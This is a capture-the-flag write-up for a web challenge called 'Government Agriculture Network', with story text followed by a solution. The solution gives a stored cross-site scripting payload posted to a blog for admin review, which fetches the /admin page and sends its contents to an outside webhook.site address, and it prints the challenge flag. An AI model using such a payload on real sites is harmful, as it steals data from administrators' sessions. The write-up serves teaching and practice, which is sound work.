[../](../../)

# Government Agriculture Network

## web

> Well it seems someone can't keep their work life and their home life separate. You vaguely recall on your home planet, posters put up everywhere that said "Loose Zips sink large commercial properties with a responsibility to the shareholders." You wonder if there is a similar concept here.
>
> Using the credentials to access this so-called Agricultural network, you realize that SarahH was just hired as a vendor or contract worker and given access that was equivalent. You can only assume that Vendor/Contractor is the highest possible rank bestowed upon only the most revered and well regarded individuals of the land and expect information and access to flow like the Xenovian acid streams you used to bathe in as a child.
>
> The portal picture displays that small very attractive individual whom you instantly form a bond with, despite not knowing. You must meet this entity! Converse and convince them you're meant to be! After a brief amount of time the picture shifts into a biped presumably ingesting this creature! HOW DARE THEY. You have to save them, you have to stop this from happening. Get more information about this Gubberment thing and stop this atrocity.
>
> You need to get in closer to save them - you beat on the window, but you need access to the cauliflower's  host to rescue it.
>
> [https://govagriculture.web.ctfcompetition.com/](https://govagriculture.web.ctfcompetition.com/)

The website is a blog where you can post new entries. If you do so and submit something, it says:

	Your post was submitted for review. Administrator will take a look shortly.

Also notice the `admin` button at the top right, so it might probably be the target. When trying to visit it, we're redirected to the main page.

Since when submitting a new post, the admin should review our content, let's try to steal the data behind `/admin` with a XSS payload.

We need an endpoint for our payload, that will receive the data. If we use an online service, like [https://webhook.site/](https://webhook.site/), we don't even have to setup our own.

The following script will request `/admin` and leak the response data via a request to our webhook to us.

```javascript
<script>
	x = new XMLHttpRequest();
	x.onload = function() {
		y = new XMLHttpRequest();
		y.open("GET", "https://webhook.site/02ad0379-670a-4c99-85ea-48b314484949/?content=" + x.response);
		y.send()
	}
	x.open("GET", "/admin");
	x.send();
</script>
```

Shortly after we created a new post with this payload, our webook receives a request and the content contains the flag.

flag: `CTF{8aaa2f34b392b415601804c2f5f0f24e}`